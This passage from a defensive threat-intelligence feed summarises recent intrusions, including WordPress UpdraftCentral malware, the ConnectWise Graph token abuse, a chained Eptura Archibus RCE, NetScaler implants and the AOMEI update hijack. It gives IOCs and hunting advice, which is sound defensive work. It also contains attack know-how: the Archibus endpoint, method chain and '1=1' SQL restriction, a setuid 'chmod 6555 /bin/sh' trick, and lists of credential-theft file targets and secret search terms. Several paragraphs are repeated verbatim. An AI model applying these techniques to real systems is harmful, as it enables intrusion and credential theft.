- The malware family has two confirmed variants. The first attempts to create a user with visible Editor role while silently granting manage_options and install_plugins capabilities, using pre_user_query and pre_count_users hooks to hide the account from dashboard queries. The second authenticates the attacker as the first existing administrator without creating a new account at all, leaving the plugin file and web-server access log as the only remaining evidence. A coding error in some first-variant samples caused HTTP 500 errors and "critical error" messages naming an unfamiliar plugin: an unexpected critical error referencing an unknown plugin name is itself an indicator. Do not trust the WordPress Users or Plugins screens on a potentially compromised site.
- IOCs from the Wordfence report include source IPs 43.250.53[.]42 and 2a09:bac5:4e21:2e3c::49b:9, and the exact User-Agent string "WordPress/6.4; class-udrpc.php" on malicious requests. The UpdraftCentral log entry "probe.central.updraftplus[.]com" and commands "plugin.upload_plugin" or "plugin.delete_plugin" indicate the channel was used. A working malware trigger pattern is a GET or POST to the site root with a query-string parameter whose name is 12 hexadecimal characters and whose value is a 32-character token. Four confirmed SHA-256 hashes are in the report for: opt4fix 2.9.2, js-fix-757a 2.8.3, lazy-tool-3055 1.3.8, and cache-smith 1.3.1, along with hashes for style-bridge-8f5 and its uninstall.php.
- Suspicious users to investigate: display name "Site Tools", usernames matching patterns like data-ops43, media-staff96, or site_editor784, and email addresses at [@]example[.]org or [@]example[.]com. At the database level, check for a WordPress option whose name ends in _sync_token, and plugin-associated options ending in _uid or _installed. The local UpdraftCentral key lives in the wp_options row named updraft_central_localkeys: a populated array there means the channel was open. Check Settings > UpdraftPlus > Advanced Tools > UpdraftCentral in the dashboard as well, but treat the database as the authoritative source.
- Scope is limited to sites that had an active cloud UpdraftCentral connection key. Self-hosted UpdraftCentral installs, third-party backup storage (Google Drive, Dropbox, S3), and UpdraftPlus plugin downloads were not affected. UpdraftVault sites have been disconnected by TeamUpdraft and need manual reconnection with new credentials. UpdraftClone keys have been replaced and are available in My Account.
DFIR action: Before touching anything, preserve the UpdraftCentral log, web-server access logs, PHP error logs, and copies of any suspicious files. Then query web-server access logs for the 12-hex-character query parameter pattern and correlate hits with plugin writes or administrator session activity. Inspect wp-content/plugins, wp-content/mu-plugins, wp-content/upgrade, and uploads directories for PHP files created or modified on October 18-19, 2026. Pull user capabilities directly from the database, not from the dashboard. A clean dashboard does not clear a site: the second malware variant leaves no new user row to find. If any indicator is present, restore from a backup predating October 17, 2026 and rotate all credentials the compromised site could reach. IOCs, plugin hashes, and database indicators are in the Wordfence report.

item.title: Beyond the mailbox: Graph reconnaissance and ServiceNow user enumeration in a modern identity intrusion
item.description:
A single vishing call unlocked a full SaaS estate: M365 identity compromise led to Graph API reconnaissance, ~100,000 SharePoint downloads, and a ServiceNow user-table export of ~2,500 records, all through legitimate cloud workflows with no malware involved.
Key findings:
- Initial access came entirely through SSPR abuse (T1656). The threat actor called a user, impersonated help desk staff, and talked them into handing over the SMS MFA code mid-reset flow. No phishing page, no malware, no OAuth prompt. Within minutes the actor registered a new Windows device in Entra ID (T1098.005), obtained a Primary Refresh Token, and established a durable authenticated session. Subsequent federated access to Salesforce and ServiceNow logged MFA as "Previously satisfied," meaning the actor never needed to re-authenticate interactively to each platform.
- Graph API reconnaissance (T1087.004) was logged in GraphApiAuditEvents from Microsoft Defender. The actor queried hxxps[://]graph[.]microsoft[.]com/v1[.]0/me/licenseDetails, hxxps[://]graph[.]microsoft[.]com/v1[.]0/organization, hxxps[://]graph[.]microsoft[.]com/beta/tenantRelationships/getResourceTenants, role assignments via transitiveRoleAssignments, owned ServicePrincipal objects with $top=999, verified domains, SharePoint sites, and individual user UPNs. This is a structured directory survey covering licensing, tenant relationships, roles, and application inventory from a single user session.
- SharePoint (T1213.002) bore the heaviest data loss: approximately 100,000 files downloaded. SearchQueryInitiatedSharePoint logs recovered the keyword list the actor used, including password, cred, ssh, aws, vpn, SSN, contracts, and notably the name of the organization's own MFA vendor, spelled with several variants, suggesting prior knowledge of the identity stack or active searching for bypass documentation. The actor also accessed over 100 mail items (T1114.002) across the compromised mailbox and shared mailboxes it had access to, selecting emails related to credentials, customer data, org structure, and approval workflows.
- ServiceNow was the clearest non-Microsoft impact. Federated SAML sign-in from the existing PRT-backed session gave the actor access. Logs showed navigation to the sys_user list view, repeated access, an export operation, and read access to the generated sys_user.csv attachment containing approximately 2,500 records (T1567). The sys_user table holds names, emails, phone numbers, roles, departments, and manager relationships. The same session also browsed the CMDB cmdb_ci_computer list view, though no export from that table was confirmed. Salesforce was reached the same way but Salesforce's own anomaly detection fired a SuspiciousActivity event and auto-froze the account before large-scale CRM extraction occurred.
- Defense evasion (T1070.008) was minimal but deliberate: no inbox rules, no forwarding, no new OAuth applications. The actor deleted exactly two emails, one of which was the organization's own company-wide vishing-awareness notification. That deletion confirms the actor read the warning, understood the organization had detected the campaign, and suppressed the alert from the compromised user's view before continuing operations.
Practitioner takeaway: Hunt GraphApiAuditEvents for directory, role, and service principal enumeration from a single user session across a short window, SearchQueryInitiatedSharePoint for terms like password, cred, aws, vpn, ssh, or your own MFA vendor's name, and MailItemsAccessed events on security-notification emails followed by their deletion. Containment must include session and refresh token revocation at the identity provider and every federated SaaS platform, not just a password reset. For ServiceNow specifically, bulk export from sys_user or cmdb_ci_computer is a high-confidence investigative signal worth dedicated detection coverage. IOCs for this case are being published to the Sophos X-Ops GitHub repository.

item.title: Detections Digest #20261019
item.description:
Detection Engineering Digest: 23 new and 19 updated rules across cloud, endpoint, AI infrastructure, and email security land this week across 6 monitored GitHub repositories.
Key findings:
- LLM and agentic AI infrastructure is becoming a first-class detection target. Cisco AI Defense analytics now flag prompt injection bursts and PII/PCI leakage across allowed prompts and responses. KQL rules in benscha/KQLAdvancedHunting monitor MCP client User-Agent strings in Azure DevOps audit logs (ADOAuditLogs) and Microsoft Sentinel UEBA (BehaviorAnalytics) for bulk operations exceeding thresholds. Agent-Threat-Rule/agent-threat-rules tightened regexes across tool argument conditions covering path traversal, shell chaining, SQL injection, sensitive file access, and environment extraction, cutting benign corpus false positives from 12.8% to 1.06%.
- Cloud credential theft and lateral movement coverage expanded meaningfully. New KQL rules monitor Azure Key Vault data plane logs (CloudKeyVaultEvents) for high-volume secret retrieval within 10-minute windows, access from IPs not seen in the past 14 days, and anomalous User-Agent plus IP combinations. A separate rule hunts local Azure credential theft by inspecting process telemetry for references to azurermcontext.json and msal_token_cache alongside archiving tools such as Copy-Item, Robocopy, and 7z. New AWS CloudTrail analytics address external trust assume-role escalation with wildcard entities, repeated EC2 Instance Connect SendSSHPublicKey calls for lateral movement, and EC2 userData script modification on stopped instances for persistence.
- Endpoint defense impairment coverage got sharper across registry, ETW, and kernel layers. New Sigma rules in SigmaHQ/sigma detect registry writes to the AuthorizedApplications key and DoNotAllowExceptions set to 0 under FirewallPolicy, and flag reg.exe modifications disabling Task Manager, Command Prompt, and registry editing tools. ETW evasion detections were updated to match decimal property value 17 alongside hex 0x11 during Set-EtwTraceProvider execution across both PowerShell script block logs and process command lines, binding arguments to binaries including wevtutil.exe, logman.exe, and PowerShell. LOLDrivers updated MD5, SHA1, SHA256, and IMPHASH values across two driver load monitoring rules for current BYOVD threat data.
- Email threat detections in sublime-security/sublime-rules received both new rules and broad updates. A new rule inspects inbound URLs for Microsoft OAuth parameters including offline_access, ctx, and sessionId to catch illicit consent grant flows via self-service hosting platforms. A second new rule targets fraudulent IRS W-9 lures by flagging PDF attachments produced by the MuhammaraJS or Hummus-Recipe libraries paired with OCR-detected IRS references. Brand impersonation rules for FedEx, Evite, MyChart, and Google Workspace received updated NLU entity checks, null-safe DMARC parsing, and expanded regex patterns. A renamed binary detection was also added, correlating ProcessVersionInfoOriginalFileName mismatches with digital signature data across Python, command interpreters, and LOLBAS utilities.
Practitioner takeaway: prioritize deploying the Azure Key Vault and MCP User-Agent KQL rules if you run Azure workloads, and pull the updated Sigma ETW rules into your pipeline since the decimal-vs-hex gap has been a real detection blind spot. The updated LOLDrivers hashes are in the magicsword-io/LOLDrivers repository. For teams hunting agentic AI abuse, the benscha/KQLAdvancedHunting and Agent-Threat-Rule/agent-threat-rules repositories are the clearest starting points this week.

LOLDrivers updated MD5, SHA1, SHA256, and IMPHASH values across two driver load monitoring rules for current BYOVD threat data.

- Email threat detections in sublime-security/sublime-rules received both new rules and broad updates. A new rule inspects inbound URLs for Microsoft OAuth parameters including offline_access, ctx, and sessionId to catch illicit consent grant flows via self-service hosting platforms. A second new rule targets fraudulent IRS W-9 lures by flagging PDF attachments produced by the MuhammaraJS or Hummus-Recipe libraries paired with OCR-detected IRS references. Brand impersonation rules for FedEx, Evite, MyChart, and Google Workspace received updated NLU entity checks, null-safe DMARC parsing, and expanded regex patterns. A renamed binary detection was also added, correlating ProcessVersionInfoOriginalFileName mismatches with digital signature data across Python, command interpreters, and LOLBAS utilities.

Practitioner takeaway: prioritize deploying the Azure Key Vault and MCP User-Agent KQL rules if you run Azure workloads, and pull the updated Sigma ETW rules into your pipeline since the decimal-vs-hex gap has been a real detection blind spot. The updated LOLDrivers hashes are in the magicsword-io/LOLDrivers repository. For teams hunting agentic AI abuse, the benscha/KQLAdvancedHunting and Agent-Threat-Rule/agent-threat-rules repositories are the clearest starting points this week.

item.title: Compromised ConnectWise Cloud Backup identities used to access Microsoft 365 tenants
item.description:
Compromised ConnectWise Cloud Backup credentials gave a threat actor authenticated access to Microsoft 365 tenants via trusted service principals, hitting 160+ confirmed environments.
Key findings:
- The threat actor obtained a credential belonging to the ConnectWise Cloud Backup (formerly SkyKick) application and used it to acquire Microsoft Graph access tokens across customer tenants. Microsoft Graph itself was not breached. The attacker simply authenticated as the trusted application and inherited whatever permissions had already been delegated, including high-privilege grants like Directory.ReadWrite.All. ConnectWise disabled or revoked access for seven affected Cloud Backup and Cloud Management application identities as part of containment.
- Persistence was established inside at least one tenant before revocation. A ConnectWise Cloud Management - MS Teams application assigned itself the Global Administrator role and added credentials to other trusted service principals. Those new credentials operate independently, meaning they survive the original application being disabled or its credential rotated. Revoking the ConnectWise identity alone does not guarantee a clean environment.
- Scope grew during the investigation. Unauthorized sign-ins were confirmed in more than 160 tenants, with authentication activity observed across hundreds of Microsoft 365 environments. Activity also extended to multiple Cloud Management applications beyond the originally identified Cloud Backup identity, broadening the attack surface.
- For managed service providers, exposure is multiplied. Backup and management platforms are by design granted delegated access across many customer tenants. A single compromised application identity can create parallel downstream exposure across an entire MSP customer base. Both internal and customer tenants require independent review.
- Microsoft Threat Intelligence observed three specific post-access behaviors: successful service principal authentication, Microsoft Graph reconnaissance, and attempts to add additional credentials to service principals. These are the signals to hunt for in your own environment.
Practitioner takeaway: Pull service principal sign-in logs from Microsoft Entra for all ConnectWise Cloud Backup and SkyKick application IDs covering the period before October 16, 2026. Then review OAuth consent grants, privileged role assignments, and application credential objects (secrets and certificates) for unexpected additions. Any newly created credentials on service principals that the ConnectWise application touched represent persistence that survives the revocation ConnectWise already performed. The report notes affected application IDs and IOCs are published by the vendor; cross-reference those in your Entra audit logs. If you are an MSP, run this review for every customer tenant, not just your own.

item.title: Authentication Bypass, Remote Code Execution, and Database Read in Eptura Archibus (FIXED)
item.description:
Three chained CVEs in Eptura Archibus deliver unauthenticated RCE and full database read, affecting a platform used by 16,000 organizations including 40% of the Fortune 500.
Key findings:
- CVE-2026-107186 (CVSS 8.6) is the root cause: a Java Direct Web Remoting (DWR) batch-call race condition lets an unauthenticated attacker chain two methods in a single POST to /archibus/dwr/call/plaincall/Multiple.2.dwr. The whitelisted SecurityService.isPasswordUppercase() method internally calls loadTableDef(), which writes a privileged core user session into the thread-local ContextStore. Because DWR processes batch calls sequentially on the same thread, the immediately following DWRWorkflowService.runWorkflowRule() call inherits that session and executes as authenticated. The only prerequisites are a JSESSIONID (obtained by browsing to /archibus/login.axvw) and a PROJECT_ID (obtained via an unauthenticated call to SecurityService.getProjects).
- CVE-2026-107187 (CVSS 8.5) chains directly off the auth bypass to invoke the AbCommonResources-getDataRecords workflow, which passes a caller-controlled restriction parameter directly into a SQL query against any Archibus-managed table. The PoC queries the afm_users table for user_name, user_pwd, email, and role_name with restriction set to 1=1, dumping all credentials in plaintext in the JSON response.
- CVE-2026-107188 (CVSS 9.6 Critical) is the RCE path: the AbCommonResources-writeHTMLtoFile workflow writes attacker-controlled content to disk using an attacker-controlled file extension with no validation (ViewHandlers.writeHTMLtoFile in the source). The server returns the browsable output path under /archibus/schema/per-site/exportReports/. Uploading with a .jspx extension bypasses the authentication redirect that .jsp files trigger, so browsing to the file executes the embedded Java code. Rapid7 confirmed RCE on a live Vector Command customer server, with code running as NT AUTHORITY/Local Service.
- For responders: the attack surface is HTTP-reachable Archibus Web Central with no credentials required. The upload lands in a predictable path (/archibus/schema/per-site/exportReports/) with a DataViewReport prefix and a timestamp before the .jspx extension. Hunting starts there: check that directory for unexpected .jspx or .jsp files, review web server access logs for POST requests to /archibus/dwr/call/plaincall/Multiple.2.dwr with callCount=2 where one parameter references isPasswordUppercase and another references writeHTMLtoFile or getDataRecords, and treat any outbound activity from the Java application server process as post-exploitation.
Takeaway: patch to Archibus 2025.02 or higher, which moves the vulnerable DWR method to a REST API, closing the batch-call chaining primitive entirely. If you cannot patch immediately, audit the exportReports directory for webshells and pull DWR access logs for callCount=2 batch requests hitting SecurityService.isPasswordUppercase. This was found during a red team engagement on an active customer environment, meaning opportunistic exploitation of internet-exposed instances is a realistic near-term threat given the Fortune 500 footprint. The disclosure timeline in Rapid7's report shows repeated non-response from Eptura before a fix was confirmed, so verify your version is actually patched and not just recently released.

item.title: Rapid7 Analysis: NetScaler intrusions chaining CVE-2026-88771 and CVE-2026-88779
item.description:
CVE-2026-88771 and CVE-2026-88779 chained in active NetScaler intrusions: pre-auth log poisoning plus a SAML crash deliver root execution, persistent implants, and internal recon targeting AD, vCenter, and key material.
Key findings:
- The two-CVE chain works as follows: CVE-2026-88771 injects attacker-controlled command text into the nsaaad authentication log, while CVE-2026-88779 triggers a SAML-parsing crash that forces a Pitboss reboot. The NetScaler call-home crash handler then re-executes the retained poisoned log text as root, confirmed by filesystem timestamps matching post-reboot handler activity to the second. The handler was triggered repeatedly across several days, functioning as a repeatable execution trampoline that let the operator refresh persistence and deploy new components after each restart. Three dropper hashes are in the report: 1[.]sh (6774bfed...), 17447d[.]sh (a0ba4e1a...), and 2[.]sh/r.sh (56a892d8...).
- Persistence is layered and HA-aware. The .slap framework under /nsconfig/.slap used cron, rc.netscaler, watchdog loops, and a reverse agent polling an external endpoint every 15 seconds via HTTP PUT. Three PHP web shells (.slap.receiver, .ctxs.receiver, receiver.deb) were dropped into the LogonPoint custom directory and hidden behind Apache aliases mapped to CSS-looking URLs such as /logon/LogonPoint/custom/receiver.v2.min.css. Commands arrived in a cookie header and responses returned in HTTP 404 bodies. The attacker repeatedly set chmod 6555 /bin/sh (T1548.001), making it setuid/setgid so the unprivileged Apache web process could obtain effective root. A second branch dropped the FreeBSD Go proxy nsvmd (hash ffe052fc...) under /flash/.nsvm/ with a 45-second watchdog, daily cron guards, and chflags uchg to make the binary immutable. HA sync and forced failover logic attempted to push implant files to the peer node.
- A stripped, statically linked FreeBSD Go binary, scanner-freebsd-amd64 (hash 8e8b9532...), installed as /nsconfig/.slap/vc, performed two-phase internal reconnaissance: broad RFC1918 scanning, then targeted scanning of ranges derived from DNS and LDAP results. It performed DNS zone-transfer hunting, LDAP anonymous bind and RootDSE queries, management-service fingerprinting, TLS certificate inspection, and VMware vCenter classification. Results were written to structured TSV files prefixed vcpersist-, then compressed and uploaded to operator infrastructure.
- Configuration and key material were staged and confirmed exfiltrated. The attacker collected ns.conf.0 through ns.conf.4, ns.conf.bak, /etc/httpd.conf, and system backup archives from /nsconfig/ into /var/tmp/.s2loot/, then downloaded a staged archive through the web interface. The HTTP 200 response size matched the archive, providing direct exfiltration evidence. Material at risk includes LDAP/RADIUS bind credentials, SSL private keys, and key-encryption material. C2 infrastructure includes v5v[.]in, 192.159.99[.]139, 209.74.64[.]192, 213.209.159[.]55, and 45.92.1[.]17 on port 30444, among others listed in the report.
Practitioner takeaway: treat any Internet-exposed NetScaler 14.1 build vulnerable during the campaign window as compromised, not merely at risk. Before rebooting or rebuilding, collect volatile state: inspect both HA nodes, not just the active one. Hunt for /nsconfig/.slap/, /nsconfig/.relay/, and /flash/.nsvm/ paths; look for setuid /bin/sh, unauthorized Apache PHP handlers, and CSS-aliased URLs in httpd.conf. Search ns logs for nsaaad crash loops, Pitboss reboot events, and ns_monuploadd_err.pl execution records. Rotate all credentials and keys reachable through /nsconfig immediately. YARA rules and the full IOC set are available in Rapid7's Intelligence Hub.

item.title: ConnectWise Cloud Backup Breach: What We Know
item.description:
ConnectWise Cloud Backup breach: a compromised vendor application credential granted attackers Microsoft Graph access tokens across nearly 1,000 customer Entra tenants, with observed persistence in at least one tenant via Global Administrator role assignment.
Key details:
- The credential at the center of this incident was a client assertion tied to ConnectWise's own application identity, not a customer password. Attackers possessing that API secret could authenticate as the ConnectWise service principal and inherit whatever Microsoft 365 permissions customers had already consented to, covering mailboxes, OneDrive, SharePoint, Teams, and directory data. MFA and password resets do not block this path because the authentication is application-only with no interactive user prompt. The primary suspicious authentication IP was 144.172.64[.]128, with two additional IPs shared by ConnectWise: 144.172.64[.]99 and 144.172.64[.]60. User-agent strings Python-urllib/3.12 and curl/7.88.1 were observed during the suspicious activity and password spraying phases respectively.
- Huntress identified sign-in activity from 144.172.64[.]128 across almost 1,000 Entra tenants, with more than 300 successful authentications. A second, more targeted wave on October 15 hit 16 tenants in policy, national security, trade, and critical mineral sectors, sweeping Exchange Online, SharePoint Online, Teams, Azure Resource Manager, Entra, and Office 365 Management APIs. Most of those targeted tenants did not use ConnectWise products. Activity has not been attributed to a known threat actor.
- Persistence was observed in at least one tenant. The ConnectWise Cloud Management - MS Teams application (client ID 24205314-2b89-4e07-a2a4-579e898a5640) assigned itself Global Administrator privileges and then added new client secrets to two other trusted applications in that tenant. Huntress later observed those newly created credentials being used for additional sign-ins. Disabling the original ConnectWise application does not remove attacker-added secrets, certificates, or roles already written into the tenant.
- Seven application identities were disabled by ConnectWise at 07:00 UTC on October 17, but previously issued access tokens may remain valid until expiry. The full list of client IDs to hunt includes: Cloud Backup (506e08f9-6e9a-4da4-942b-a099a03644ae), Cloud Management (2399d300-6fca-4e6a-a686-399fefe75b83), and the five Cloud Management sub-applications listed in the report. Older tenants may show these under legacy SkyKick Cloud Manager display names. Match on client ID, not display name.
- ConnectWise states existing Cloud Backup archives remain encrypted and isolated with no evidence of access to stored data. However, ConnectWise acknowledges it lacks sufficient visibility into downstream customer environments to confirm whether live tenant data was read. Some Microsoft Graph read operations leave limited or no useful audit trail, so the absence of visible read events cannot rule out data access.
Responder action: Pull Service principal sign-ins from Entra, not standard user sign-ins, and review from October 1 onward. Hunt the seven client IDs above and all sign-ins from 144.172.64[.]128, 144.172.64[.]99, and 144.172.64[.]60. For each tenant, audit application-management and role-management logs for new client secrets, certificates, federated credentials, consent grants, and any assignment of Global Administrator, Privileged Role Administrator, Application Administrator, Exchange Administrator, or SharePoint Administrator roles. Check mailbox forwarding rules, inbox rules, transport rules, and Conditional Access changes. Keep affected service principals disabled but not deleted to preserve forensic configuration. Export and preserve Entra and Purview audit logs before retention windows close.

item.title: AOMEI Backupper update servers hijacked to push malware: Check your PC
item.description:
AOMEI Backupper's update infrastructure was hijacked to push a persistent backdoor to users of software installed on over 100 million PCs worldwide. Google's Threat Intelligence Group investigated the supply chain compromise between April and July 2026.
Key findings:
- Attackers altered AOMEI's remote configuration file to redirect the software's update download to a malicious ZIP archive, simultaneously changing the expected version number and MD5 checksum so the client would validate and execute the payload. Because both the download URL and the checksum lived in the same config file, a single write gave attackers full control over what the client fetched and trusted.
- Google's GTIG confirmed three tampering windows of ten, six, and five minutes each during the investigation period, though additional windows may have occurred outside the observed timeframe. The brevity of each window reduced victim volume but also made the campaign significantly harder to detect through routine monitoring.
- The delivered payload, upgrade-now.exe (detected as Malware[.]AI.4006642887), is a downloader that stages a persistent remote-access backdoor, creates a scheduled task named RadminComponentRuntime for persistence, and then deletes itself. Self-deletion means the absence of upgrade-now.exe on disk is not a clean bill of health.
- Network indicators tied to this campaign: promotion.storage-data[.]com, aomei.storage-data[.]com, storage-data[.]com, and IPs 8.210.84[.]56, 47.239.60[.]117, and 8.218.65[.]184. The AnyViewer product shares the same update infrastructure, though confirmed AnyViewer infections were not separately identified in the report.
- The backdoor class of payload matters here: this is not ransomware or an infostealer with a defined endgame. It gives the operator arbitrary command execution and the ability to install further malware, meaning an infected host remains an open foothold of unknown depth until fully investigated and rebuilt.
Practitioner takeaway: If your environment includes AOMEI Backupper, start hunting now. In Windows Task Scheduler, check the Task Scheduler Library for a task named RadminComponentRuntime. Examine the AOMEI Backupper installation folder, especially version-specific html and Tmphtml subdirectories, for upgrade-now.exe or upgrade-now[.]zip. Review proxy, firewall, and DNS logs for connections to the domains and IPs above, blocked or allowed, during the April to July window. Remember the downloader deletes itself post-execution, so a missing binary does not clear the host. Any positive indicator warrants isolation and a full incident response engagement rather than manual cleanup.

The brevity of each window reduced victim volume but also made the campaign significantly harder to detect through routine monitoring.

- The delivered payload, upgrade-now.exe (detected as Malware[.]AI.4006642887), is a downloader that stages a persistent remote-access backdoor, creates a scheduled task named RadminComponentRuntime for persistence, and then deletes itself. Self-deletion means the absence of upgrade-now.exe on disk is not a clean bill of health.

- Network indicators tied to this campaign: promotion.storage-data[.]com, aomei.storage-data[.]com, storage-data[.]com, and IPs 8.210.84[.]56, 47.239.60[.]117, and 8.218.65[.]184. The AnyViewer product shares the same update infrastructure, though confirmed AnyViewer infections were not separately identified in the report.

- The backdoor class of payload matters here: this is not ransomware or an infostealer with a defined endgame. It gives the operator arbitrary command execution and the ability to install further malware, meaning an infected host remains an open foothold of unknown depth until fully investigated and rebuilt.

Practitioner takeaway: If your environment includes AOMEI Backupper, start hunting now. In Windows Task Scheduler, check the Task Scheduler Library for a task named RadminComponentRuntime. Examine the AOMEI Backupper installation folder, especially version-specific html and Tmphtml subdirectories, for upgrade-now.exe or upgrade-now[.]zip. Review proxy, firewall, and DNS logs for connections to the domains and IPs above, blocked or allowed, during the April to July window. Remember the downloader deletes itself post-execution, so a missing binary does not clear the host. Any positive indicator warrants isolation and a full incident response engagement rather than manual cleanup.

item.title: Unit 42 traces Peerstitch malware deployment to FortiOS vulnerability exploited after FortiManager compromise
item.description:
Nation-state-linked attackers compromised a telecom MSP's FortiManager, exfiltrating configs and credentials for 500+ managed firewalls, then deployed novel memory-resident malware Peerstitch via a second FortiOS zero-day.
Key findings:
- Initial access via CVE-2024-47575, a FortiManager flaw allowing unauthenticated remote command execution. Attackers registered a rogue virtual firewall device to the management appliance, then immediately generated and exfiltrated a configuration archive containing complete running configs, routing tables, interface details, public IPs, and encrypted credentials plus private keys for 500+ managed FortiGate devices across both the MSP and its clients. One appliance, one archive, the entire trust fabric gone.
- Attackers (tracked as CL-STA-0954, with post-exploitation overlaps to suspected nation-state actors) used the compromised FortiManager to push unauthorized packet-capture rules to downstream firewalls. Targets included unencrypted HTTP across 11 TCP services, TFTP, RADIUS and RADIUS-Accounting traffic, and LDAP queries, directly mapping Active Directory and intercepting authentication at scale.
- Peerstitch is a memory-resident ARM64 implant deployed via CVE-2025-61624, a FortiOS privilege-escalation exploited through auto-script path traversal. It writes no binary to disk, opens no listening ports, and initiates no outbound connections. Instead it builds a covert inter-process communication bridge inside process memory and communicates through traffic generated by legitimate firewall processes, making it resistant to both endpoint and network-based detection. Attackers also impersonated the FortiManager platform to pull configurations from additional firewalls.
- Anti-forensics were deliberate and layered. Attackers halted local and remote logging before running malicious scripts, cleared crash logs from early memory-injection attempts, auto-deleted rogue admin accounts, VPN groups, and script objects post-execution, overwrote a legitimate config file with benign content to mask remote shell setup, and had at least one tool delete its own binary and kill the setup process before exiting. Intermittent drops on the tunnel management interface during malicious activity are assessed with medium confidence as deliberate telemetry suppression.
- The cryptographic trust material stolen here does not expire when the platform is patched. Private keys and certificates governing FortiManager's relationships with every enrolled device remain valid and usable by the attacker until explicitly rotated. For MSPs and MSSPs, this is the critical remediation step that patching alone does not address.
Takeaway: If you manage Fortinet infrastructure for others, your FortiManager is the highest-value target you own. Treat it as compromised until you have audited rogue device registrations, confirmed logging continuity during the September 2024 window, and rotated every certificate and credential in the management trust store. Hunt for unauthorized sniffer configs pushed to downstream FortiGate devices and review auto-script execution logs for path traversal patterns tied to CVE-2025-61624. The full technical breakdown is in Unit 42's report.
